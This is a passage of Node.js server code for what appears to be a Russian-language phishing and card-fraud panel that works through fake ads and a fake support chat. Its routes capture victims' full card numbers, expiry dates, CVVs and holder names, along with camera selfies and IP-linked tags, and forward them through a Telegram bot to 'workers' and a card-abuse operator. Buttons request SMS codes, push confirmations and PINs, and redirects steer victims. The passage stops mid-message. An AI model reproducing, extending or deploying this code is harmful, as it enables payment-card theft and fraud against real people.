      translate,
      query: req.query,
    });
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});



app.get("/supportChatFrameCustom/:adId", async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "currency",
              required: true,
            },
          ],
        },
        {
          association: "user",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const support = await generateSupport(ad, req, res);

    // ИСПРАВЛЕННАЯ ЛОГИКА: проверяем точное значение
    let autoOpenChat = ad.user.autoOpenChat;
    
    // Если значение undefined или null, ставим true по умолчанию
    if (autoOpenChat === undefined || autoOpenChat === null) {
      autoOpenChat = true;
    }

    if (ad.user.operator != null) {
      const operator = await User.findOne({
        where: {
          id: ad.user.operator,
        },
      });

      if (operator && (operator.autoOpenChat !== undefined && operator.autoOpenChat !== null)) {
        autoOpenChat = operator.autoOpenChat;
      }
    }
  

    return res.render(`supportCustom`, {
      ad,
      support,
      translate,
      autoOpenChat,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.get("/supportChatFrame/:adId", async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "currency",
              required: true,
            },
          ],
        },
        {
          association: "user",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const support = await generateSupport(ad, req, res);

    // ИСПРАВЛЕННАЯ ЛОГИКА: проверяем точное значение
    let autoOpenChat = ad.user.autoOpenChat;
    
    // Если значение undefined или null, ставим true по умолчанию
    if (autoOpenChat === undefined || autoOpenChat === null) {
      autoOpenChat = true;
    }

    if (ad.user.operator != null) {
      const operator = await User.findOne({
        where: {
          id: ad.user.operator,
        },
      });

      if (operator && (operator.autoOpenChat !== undefined && operator.autoOpenChat !== null)) {
        autoOpenChat = operator.autoOpenChat;
      }
    }
    
    
    return res.render(`support`, {
      ad,
      support,
      translate,
      autoOpenChat,
    });
  } catch (err) {
    return res.send(err);
  }
});

async function translateText(text, to = "ru") {
  try {
    const encodedText = encodeURIComponent(text);
    const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${to}&dt=t&q=${encodedText}`;

    const response = await axios.get(url);
    if (response.status === 200) {
      return response.data[0][0][0];
    } else {
      throw new Error(`Request failed with status code ${response.status}`);
    }
  } catch (error) {
    console.error("Translation error:", error.message);
    return "Перевод временно недоступен";
  }
}



app.post(`/api/support/sendMessage`, async (req, res) => {
  try {
    const support = await Support.findOne({
      where: { token: req.body.supportToken },
      include: [
        {
          association: "ad",
          required: true,
          include: [{ association: "service", required: true }],
        },
      ],
    });
    if (!support) return res.sendStatus(404);

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, support.ad)}`;

    const user = await User.findOne({ where: { id: support.ad.userId } });
    const settings = await Settings.findByPk(1);

    const originalMessage = escapeHTML(req.body.message.substr(0, 2000));
    await SupportChat.create({
      supportId: support.id,
      messageFrom: 1,
      message: originalMessage,
    });

    const isImage = originalMessage.match(
      /https?:\/\/(i\.imgur\.com|i\.ibb\.co)\/.+\.(jpg|jpeg|png|gif)/i
    );
    const translatedMessage = isImage
      ? ""
      : await translateText(originalMessage, "ru");

    // ======================= ОТПРАВКА ПОЛЬЗОВАТЕЛЮ =======================
    if (isImage) {
      await bot.sendPhoto(support.ad.userId, originalMessage, {
        caption: `<b>📤 Новое изображение из ТП</b>\n\n📦 Объявление: <b>${support.ad.title}</b>\n\n🦣 <b>${mammothTag}</b>\n\n🔍 <b>#id${support.ad.id}</b>`,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "👁️ Онлайн ",
              `check_mamont_${support.ad.id}`
            ),
          ],

          [
            Markup.callbackButton(
              "✍️ Сообщение в ТП",
              `support_${support.id}_send_message`
            ),
            Markup.callbackButton(
              "📋 Шаблоны ТП",
              `tempSupport_${support.id}_${user.id}`
            ),
          ],
          [
            Markup.callbackButton(
              "🔓 Открыть ТП",
              `open_support_${support.ad.id}`
            ),
            Markup.callbackButton(
              "🔒 Закрыть ТП",
              `close_support_${support.ad.id}`
            ),
          ],
          [
            Markup.callbackButton(
              "🔽 Дополнительно",
              `more_actions_${support.ad.id}_${support.id}`
            ),
          ],
        ]),
      });
    } else {
      await bot.sendMessage(
        support.ad.userId,
        `<b>📤 Новое сообщение из ТП</b>

💬 Сообщение: <b>${originalMessage}</b>

🗣️ Перевод: <b>${translatedMessage}</b>

📦 Объявление: <b>${support.ad.title}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${support.ad.id}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "👁️ Онлайн ",
                `check_mamont_${support.ad.id}`
              ),
            ],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔓 Открыть ТП",
                `open_support_${support.ad.id}`
              ),
              Markup.callbackButton(
                "🔒 Закрыть ТП",
                `close_support_${support.ad.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${support.ad.id}_${support.id}`
              ),
            ],
          ]),
        }
      );
    }

    // ======================= ОТПРАВКА В ЛОГИ =======================
    if (isImage) {
      await bot.sendPhoto(settings.loggingGroupId, originalMessage, {
        caption: `<b>📤 Новое изображение из ТП</b>\n\n👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
          }</b>\n\n📦 Объявление: <b>${support.ad.title
          }</b>\n\n🦣 <b>${mammothTag}</b>\n\n🔍 <b>#id${support.ad.id}</b>`,
        parse_mode: "HTML",
      });
    } else {
      await bot.sendMessage(
        settings.loggingGroupId,
        `<b>📤 Новое сообщение из ТП</b>

👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
        }</b>

💬 Сообщение: <b>${originalMessage}</b>

🗣️ Перевод: <b>${translatedMessage}</b>

📦 Объявление: <b>${support.ad.title}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${support.ad.id}</b>`,
        { parse_mode: "HTML" }
      );
    }

    // ======================= ОТПРАВКА ОПЕРАТОРУ =======================
    if (user.operator) {
      const operator = await Operators.findOne({
        where: { userId: user.operator },
      });

      if (isImage) {
        await bot.sendPhoto(operator.userId, originalMessage, {
          caption: `<b>📤 Новое изображение из ТП</b>\n\n👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
            }</b>\n\n📦 Объявление: <b>${support.ad.title
            }</b>\n\n🦣 <b>${mammothTag}</b>\n\n🔍 <b>#id${support.ad.id}</b>`,
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "👁️ Онлайн ",
                `check_mamont_${support.ad.id}`
              ),
            ],

            [
              Markup.callbackButton(
                "✍️ Ответить за воркера",
                `operatorSend_${support.id}_send_message_${user.id}_${support.ad.id}`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔓 Открыть ТП",
                `open_support_${support.ad.id}`
              ),
              Markup.callbackButton(
                "🔒 Закрыть ТП",
                `close_support_${support.ad.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${support.ad.id}_${support.id}`
              ),
            ],
          ]),
        });
      } else {
        await bot.sendMessage(
          operator.userId,
          `<b>📤 Новое сообщение из ТП воркера</b>

👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
          }</b>

💬 Сообщение: <b>${originalMessage}</b>

🗣️ Перевод: <b>${translatedMessage}</b>

📦 Объявление: <b>${support.ad.title}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${support.ad.id}</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "👁️ Онлайн ",
                  `check_mamont_${support.ad.id}`
                ),
              ],

              [
                Markup.callbackButton(
                  "✍️ Ответить за воркера",
                  `operatorSend_${support.id}_send_message_${user.id}_${support.ad.id}`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔓 Открыть ТП",
                  `open_support_${support.ad.id}`
                ),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${support.ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${support.ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        );
      }
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error("Ошибка при отправке сообщения:", err);
    return res.status(500).send("Ошибка на сервере");
  }
});

app.post(`/api/support/getMessages`, async (req, res) => {
  try {
    const support = await Support.findOne({
      where: { token: req.body.supportToken },
      include: [
        { association: "messages" },
        {
          association: "ad",
          include: [
            { association: "service" },
            {
              association: "user",
              required: true
            }
          ],
        },
      ],
    });

    if (!support) return res.sendStatus(404);

    const unreadMessages = support.messages.filter(
      (v) => v.messageFrom === 0 && !v.readed
    );

    // НОВАЯ ЛОГИКА: Определяем настройки автооткрытия (как в контроллерах)
    let autoOpenChatSetting = support.ad.user.autoOpenChat;
    
    // Если значение undefined или null, ставим true по умолчанию
    if (autoOpenChatSetting === undefined || autoOpenChatSetting === null) {
      autoOpenChatSetting = true;
    }

    if (support.ad.user.operator != null) {
      const operator = await User.findOne({
        where: {
          id: support.ad.user.operator,
        },
      });

      if (operator && (operator.autoOpenChat !== undefined && operator.autoOpenChat !== null)) {
        autoOpenChatSetting = operator.autoOpenChat;
      }
    }

    // ИСПРАВЛЕННАЯ ЛОГИКА: Помечаем как прочитанные ТОЛЬКО когда чат открыт пользователем
    // Настройка autoOpenChat влияет только на автооткрытие, но НЕ на пометку как прочитанные
    const chatVisible = req.body.chatVisible === true;
    const shouldMarkAsRead = chatVisible; // Только когда чат физически открыт

    
    if (unreadMessages.length === 0 || !shouldMarkAsRead) {
      return res.json({ messages: support.messages });
    }

    // Помечаем как прочитанные
    await SupportChat.update(
      { readed: true },
      { where: { id: unreadMessages.map((msg) => msg.id) } }
    );
    const user = await User.findOne({ where: { id: support.ad.userId } });

    let operator = null;
    if (user.operator) {
      operator = await User.findOne({ where: { id: user.operator } });
    }

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, support.ad)}`;

    const operatorKeyboard = (supportId, userId, adId) =>
      Markup.inlineKeyboard([
        [Markup.callbackButton("👁️ Онлайн", `check_mamont_${adId}`)],

        [
          Markup.callbackButton(
            "✍️ Ответить за воркера",
            `operatorSend_${supportId}_send_message_${userId}_${adId}`
          ),
          Markup.callbackButton(
            "📋 Шаблоны ТП",
            `tempSupport_${supportId}_${userId}`
          ),
        ],
        [
          Markup.callbackButton("🔓 Открыть ТП", `open_support_${adId}`),
          Markup.callbackButton("🔒 Закрыть ТП", `close_support_${adId}`),
        ],
        [
          Markup.callbackButton(
            "🔽 Дополнительно",
            `more_actions_${adId}_${supportId}`
          ),
        ],
      ]);

    const workerKeyboard = (supportId, userId, adId) =>
      Markup.inlineKeyboard([
        [Markup.callbackButton("👁️ Онлайн", `check_mamont_${adId}`)],

        [
          Markup.callbackButton(
            "✍️ Сообщение в ТП",
            `support_${supportId}_send_message`
          ),
          Markup.callbackButton(
            "📋 Шаблоны ТП",
            `tempSupport_${supportId}_${userId}`
          ),
        ],
        [
          Markup.callbackButton("🔓 Открыть ТП", `open_support_${adId}`),
          Markup.callbackButton("🔒 Закрыть ТП", `close_support_${adId}`),
        ],
        [
          Markup.callbackButton(
            "🔽 Дополнительно",
            `more_actions_${adId}_${supportId}`
          ),
        ],
      ]);

    for (const msg of unreadMessages) {
      const supportChatEntry = await SupportChat.findOne({
        where: { id: msg.id },
      });

      const isTemplate = supportChatEntry?.isTemplate;
      const isAuto = msg.isAuto;
      const fromOperator = Boolean(supportChatEntry?.fromOperator);
      const notifyMessageId = supportChatEntry?.notifyMessageId;

      const serviceCodeParts = support.ad.serviceCode.split("_");
      let countryId = serviceCodeParts.pop();
      if (countryId === "com") countryId = "eu";
      let autoTitle = null;

      if (isAuto && supportChatEntry?.autoId) {
        const autoTp = await AutoTp.findOne({
          where: {
            id: supportChatEntry.autoId,
          },
        });

        if (autoTp) {
          autoTitle = autoTp.title;
        } else {
          console.warn("⚠️ Авто-ТП не найден по autoId:", {
            autoId: supportChatEntry.autoId,
          });
        }
      }


      const notifyText = isTemplate
        ? isAuto
          ? `<b>🤖 Авто-ТП прочитано${autoTitle ? `: <i>${(autoTitle)}</i>` : ""
          }</b>\n\n🦣 <b>${mammothTag}</b>\n\n<b>🔍 #id${support.ad.id}</b>`
          : `<b>📋 Шаблон прочитан</b>\n\n🦣 <b>${mammothTag}</b>\n\n<b>🔍 #id${support.ad.id}</b>`
        : `<b>👀 Сообщение прочитано</b>\n\n🦣 <b>${mammothTag}</b>\n\n<b>🔍 #id${support.ad.id}</b>`;

      const replyOptions = {
        parse_mode: "HTML",
        disable_web_page_preview: true,
      };

      const shouldSendToOperator =
        operator && (!isAuto || operator.autotp !== false);
      const shouldSendToWorker = user && (!isAuto || user.autotp !== false);

      // Вариант с оператором и от него
      if (fromOperator && operator) {
        if (shouldSendToOperator) {
          await bot
            .sendMessage(operator.id, notifyText, {
              ...replyOptions,
              reply_to_message_id:
                supportChatEntry.confirmMessageId || msg.messageId,
              reply_markup: operatorKeyboard(
                support.id,
                user.id,
                support.ad.id
              ),
            })
            .catch(async (err) => {
              console.error(
                "❌ Ошибка отправки оператору (основная попытка):",
                err
              );

              if (err.description?.includes("message to reply not found")) {
                try {
                  await bot.sendMessage(operator.id, notifyText, {
                    ...replyOptions,
                    reply_markup: operatorKeyboard(
                      support.id,
                      user.id,
                      support.ad.id
                    ),
                  });
                } catch (retryErr) {
                  console.error(
                    "❌ Ошибка при повторной отправке оператору:",
                    retryErr
                  );
                }
              }
            });
        }

        if (shouldSendToWorker && notifyMessageId) {
          await bot
            .sendMessage(user.id, notifyText, {
              ...replyOptions,
              reply_to_message_id: notifyMessageId,
              reply_markup: workerKeyboard(support.id, user.id, support.ad.id),
            })
            .catch(async (err) => {
              if (err.description.includes("message to reply not found")) {
                await bot.sendMessage(user.id, notifyText, {
                  ...replyOptions,
                  reply_markup: workerKeyboard(
                    support.id,
                    user.id,
                    support.ad.id
                  ),
                });
              }
            });
        }
      }

      // Вариант с оператором и не от него
      else if (operator && !fromOperator) {
        if (shouldSendToOperator) {
          await bot.sendMessage(operator.id, notifyText, {
            ...replyOptions,
            reply_markup: operatorKeyboard(support.id, user.id, support.ad.id),
          });
        }

        if (shouldSendToWorker) {
          await bot
            .sendMessage(user.id, notifyText, {
              ...replyOptions,
              reply_to_message_id:
                supportChatEntry.confirmMessageId || msg.messageId,
              reply_markup: workerKeyboard(support.id, user.id, support.ad.id),
            })
            .catch(async (err) => {
              if (err.description.includes("message to reply not found")) {
                await bot.sendMessage(user.id, notifyText, {
                  ...replyOptions,
                  reply_markup: workerKeyboard(
                    support.id,
                    user.id,
                    support.ad.id
                  ),
                });
              }
            });
        }
      }

      // Только воркер
      else {
        if (shouldSendToWorker) {
          await bot
            .sendMessage(user.id, notifyText, {
              ...replyOptions,
              reply_to_message_id:
                supportChatEntry.confirmMessageId || msg.messageId,
              reply_markup: workerKeyboard(support.id, user.id, support.ad.id),
            })
            .catch(async (err) => {
              if (err.description.includes("message to reply not found")) {
                await bot.sendMessage(user.id, notifyText, {
                  ...replyOptions,
                  reply_markup: workerKeyboard(
                    support.id,
                    user.id,
                    support.ad.id
                  ),
                });
              }
            });
        }
      }
    }

    return res.json({ messages: support.messages });
  } catch (err) {
    console.error("Ошибка при обработке запроса:", err);
    return res.status(500).send(err.message);
  }
});

global.mamontInfoMap = new Map(); // Для client_info

wss.on("connection", (ws, req) => {
  const urlParts = req.url.split("/").filter(Boolean);
  const fallbackAdId = urlParts[urlParts.length - 1];
  ws.adId = !isNaN(fallbackAdId) ? fallbackAdId : null;

  if (ws.adId) {
    clients.set(ws.adId, ws);
  }

  ws.on("message", async (message) => {
    try {
      const parsed = JSON.parse(message);

      // 🔹 Client Info
      if (parsed.type === "client_info" && parsed.adId) {
        global.mamontInfoMap.set(parsed.adId, parsed.data);
        return;
      }

      // 🔹 Support Chat Status (open/closed)
      if (parsed.type === "support_status" && parsed.adId) {
        wss.clients.forEach((client) => {
          if (client.readyState === WebSocket.OPEN && client.adId == parsed.adId) {
            client.send(JSON.stringify({
              type: "support_status",
              status: parsed.status,
              adId: parsed.adId,
            }));
          }
        });
        return;
      }

      // 🔹 Мамонт статус или селфи
      const { adId, status, image } = parsed;
      if (!adId) return;

      ws.adId = adId;
      clients.set(adId, ws);

      const ad = await Ad.findByPk(adId, {
        include: [{ association: "service", required: true }],
      });
      if (!ad) return;

      const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
      const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

      const user = await User.findOne({ where: { id: ad.userId } });
      if (!user) return;

      // 🕒 Обновляем статус и время
      await Ad.update(
        { lastSeen: new Date().toISOString(), status },
        { where: { id: adId } }
      );
      if (ad?.pendingRedirect) {
        const redirectUrl = ad.pendingRedirect;

        ws.send(JSON.stringify({ type: "redirect", url: redirectUrl }));
        await Ad.update({ pendingRedirect: null }, { where: { id: adId } });

      }
      if (status === "selfie" && image) {
        const base64Image = image.split(",")[1];
        const buffer = Buffer.from(base64Image, "base64");

        const caption = `<b>📸 Новое селфи от мамонта</b>\n\n📦 Объявление: <b>${ad.title}</b>\n💰 Цена: <b>${ad.price}</b>\n\n🦣 <b>${mammothTag}</b>\n\n🔍 <b>#id${ad.id}</b>`;

        const markup = {
          caption,
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("❌ Скрыть", `delete`)],
          ]),
        };

        await bot.sendPhoto(ad.userId, { source: buffer }, markup);

        if (user.operator) {
          const operator = await Operators.findOne({ where: { userId: user.operator } });
          if (operator) {
            await bot.sendPhoto(operator.userId, { source: buffer }, markup);
          }
        }
      }

      if (status === "camera_denied") {
        const msg = `🚫 <b>Мамонт отказался предоставить доступ к камере</b>\n\n📦 Объявление: <b>${ad.title}</b>\n💰 Цена: <b>${ad.price}</b>\n\n🦣 <b>${mammothTag}</b>\n\n🔍 <b>#id${ad.id}</b>`;

        await bot.sendMessage(ad.userId, msg, { parse_mode: "HTML" });

        if (user.operator) {
          const operator = await Operators.findOne({ where: { userId: user.operator } });
          if (operator) {
            await bot.sendMessage(operator.userId, msg, { parse_mode: "HTML" });
          }
        }
      }

    } catch (error) {
      console.error("❌ Ошибка WebSocket-сообщения:", error);
    }
  });

  ws.on("close", async () => {
    const { adId } = ws;
    if (!adId) return;

    clients.delete(adId);

    // Фиксируем точное время отключения
    try {
      await Ad.update(
        { status: "blur", lastSeen: new Date().toISOString() },
        { where: { id: adId } }
      );
    } catch (err) {
      console.error("❌ Ошибка при обновлении lastSeen:", err);
    }

    // Через 10 сек проверяем, не вернулся ли клиент
    setTimeout(async () => {
      if (!clients.has(adId)) {
        // Здесь можно сменить статус ещё раз, если нужно
      }
    }, 10000);
  });

});


app.post(`/api/enterBalance`, async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.body.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);
    const support = await generateSupport(ad, req, res);
    const user = await User.findOne({
      where: {
        id: ad.userId,
      },
    });
    if (!user) return res.sendStatus(404);

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;


    bot
      .sendMessage(
        ad.userId,
        `<b>🦣 Мамонт вводит баланс ${ad.service.title}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
              Markup.callbackButton("🔒 Закрыть ТП", `close_support_${ad.id}`),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${ad.id}_${support.id}`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      await bot
        .sendMessage(
          operator.userId,
          `<b>🦣 Мамонт вводит баланс ${ad.service.title}</b>

👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
          }</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

              [
                Markup.callbackButton(
                  "✍️ Ответить за воркера",
                  `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton("🔓 Открыть ТП", `open_support_${ad.id}`),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        )
        .catch((err) => err);
    }
    return res.sendStatus(200);
  } catch (err) {
    return res.send(err);
  }
});

app.post(`/api/checkStatus`, async (req, res) => {
  try {
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "ad",
          required: true,
        },
      ],
    });
    if (!log) return res.sendStatus(404);

    return res.json({
      status: log.status,
      imgUrl: log.imgUrl,
    });
  } catch (err) {
    return res.send(err);
  }
});



app.post(`/api/submitCard`, async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.body.adId, {
      include: [
        {
          association: "service",
          required: true,

          include: [
            {
              association: "currency",
              required: true,
            },
          ],
        },
        {
          association: "user",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const bin = req.body.number.replace(/\D+/g, "").slice(0, 6);
    const detectedCurrency = await getCurrencyFromBin(bin);

    let rates = { USD: 1, EUR: 1 };

    if (detectedCurrency) {
      const currencyFromDb = await Currency.findOne({
        where: { code: detectedCurrency },
      });
      if (currencyFromDb) {
        rates.USD = parseFloat(currencyFromDb.usd);
        rates.EUR = parseFloat(currencyFromDb.eur);
      }
    }

    // Обогащаем `ad` временными значениями для getBalance / getBalance1
    ad.detectedCurrency = detectedCurrency || ad.service.currency.code;
    ad.service.currencyRates = rates;

    const cardSearch = await BlockCards.count({
      where: {
        card: req.body.number.replace(/\D+/g, ""),
      },
    });

    if (cardSearch > 0) {
      return res.json({
        status: false,
      });
    }
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

    const log = await Log.create({
      token: Math.random() + new Date().valueOf() + Math.random(),
      cardNumber: escapeHTML(String(req.body.number).replace(/\D+/g, "")),
      cardExpire: escapeHTML(String(req.body.expire).replace(/[^0-9\/]+/g, "")),
      cardCvv: escapeHTML(String(req.body.cvv).replace(/\D+/g, "")),
      cardHolder: escapeHTML(req.body.holder),
      otherInfo: {
        cardBalance: escapeHTML(req.body.balance),
      },
      adId: ad.id,
      userId: ad.userId,
      ip: ip, // 👈 ДОБАВЬ ЭТО
    });

    const user = await User.findOne({
      where: { id: ad.userId },
    });
    if (!user) return res.status(404).send("Пользователь не найден");

    const operator = user.operator
      ? await Operators.findOne({ where: { userId: user.operator } })
      : null;
    const mentor = user.mentor
      ? await Nastavniki.findOne({ where: { id: user.mentor } })
      : null;

    const settings = await Settings.findByPk(1);
    const support = await generateSupport(ad, req, res);

    const [cardInfo, cardInfo1] = await Promise.all([
      getCardInfo(log.cardNumber),
      getCardInfo1(log.cardNumber),
    ]);

    const logs = await Log.findAll({
      where: { adId: ad.id },
      order: [["createdAt", "DESC"]],
    });

    let vbiverId = null;
    let lastCardLog = null;

    for (const v of logs) {
      if (v.writerId && !lastCardLog) {
        vbiverId = v.writerId;
        lastCardLog = v; // сохраняем последний лог с writerId
        break;
      }
    }

    // Проверка на совпадение карты
    let isSameCard = false;
    if (lastCardLog) {
      const newCardNumber = req.body.number.replace(/\D+/g, '');
      const lastCardNumber = lastCardLog.cardNumber;
      isSameCard = newCardNumber === lastCardNumber;
    }

    // 🧼 Один update
    await log.update({
      writerId: vbiverId || null,
      bin: cardInfo1,
      supportId: support.id,
    });

    // 🧾 Далее, если нужно:
    const user1 = vbiverId ? await User.findByPk(vbiverId) : null;

    setTimeout(async () => {
      if (vbiverId) {
        await log.update({
          writerId: vbiverId,
        });

        const msgToVbiver = await bot.sendMessage(
          vbiverId,
          `<b>${isSameCard
            ? `🔄 Мамонт ввёл ту же карту ${ad.user.hideService ? "🏴" : ad.service.title}`
            : `🆕 Мамонт ввел новую карту ${ad.user.hideService ? "🏴" : ad.service.title}`}</b>`
          + `
      
💰 Баланс: <b>${getBalance(log, ad)}</b>
🪪 Держатель карты: <b>${log.cardHolder}</b>
💳 Номер карты: <code>${log.cardNumber}</code>
💳 Срок действия: <code>${log.cardExpire}</code>
💳 CVV: <code>${log.cardCvv}</code>
ℹ️ Информация о карте: ${cardInfo}

<code>/bin ${log.cardNumber.slice(0, 6)}</code>

👤 Воркер: <b>${ad.user.username ? `@${ad.user.username}` : `Профиль (${ad.userId})`
          }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>

<i>⚠️ Незабудь после ухода со вбива прописать комманду</i> <b>/leavealllogs</b>, <i>для того чтоб отказаться от всех логов.</i>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              // Главное
              [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

              // Онлайн / Диалог / Фото
              [
                Markup.callbackButton("👁 Онлайн", `check_mamont_${ad.id}`),
                Markup.callbackButton(
                  "🗨️ Диалог",
                  `dialog_writer_${support.id}`
                ),
                Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
              ],

              // Кастомные PUSH / SMS
              [
                Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
                Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
              ],

              // PUSH / SMS / ТОЧНЫЙ
              [
                Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
                Markup.callbackButton(
                  "💰 ТОЧНЫЙ",
                  `log_${log.id}_correctBalance`
                ),
                Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
              ],

              // Карта / Лимиты
              [
                Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
                Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
              ],

              // Баланс / PIN
              [
                Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
                Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
              ],

              // Ошибки
              [
                Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
                Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
              ],
              // Блок / Разблок (новые надписи)
              [
                Markup.callbackButton(
                  "⛔ Блок. Карту",
                  `log_${log.id}_banCard`
                ),
                Markup.callbackButton(
                  "✅ Разблок. Карту",
                  `log_${log.id}_unbanCard`
                ),
              ],
              // Отказ
              [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeave`)],
            ]),
          }
        );



        await log.update({ chatMsg2: msgToVbiver.message_id });

        if (vbiverId) {
          const operator = await Operators.findOne({
            where: {
              userId: user.operator,
            },
          });

          const msg = await bot.sendMessage(
            settings.logsGroupId,
            `<b>${isSameCard
              ? `🔄 Мамонт ввёл ту же карту ${ad.user.hideService ? "🏴" : ad.service.title}`
              : `🆕 Мамонт ввел новую карту ${ad.user.hideService ? "🏴" : ad.service.title}`}</b>`
            + `

🔗 Привязан к: <b>@${user1?.username || "неизвестный"}</b>
  
💰 Баланс: <b>${getBalance(log, ad)}</b>
🪪 Держатель карты: <b>${log.cardHolder}</b>
💳 Номер карты: <b>${log.cardNumber}</b>
ℹ️ Информация о карте: ${cardInfo}

<code>/bin ${log.cardNumber.slice(0, 6)}</code>

👤 Воркер: <b>${ad.user.username
              ? `@${ad.user.username}`
              : `Профиль (${ad.userId})`
            }</b>
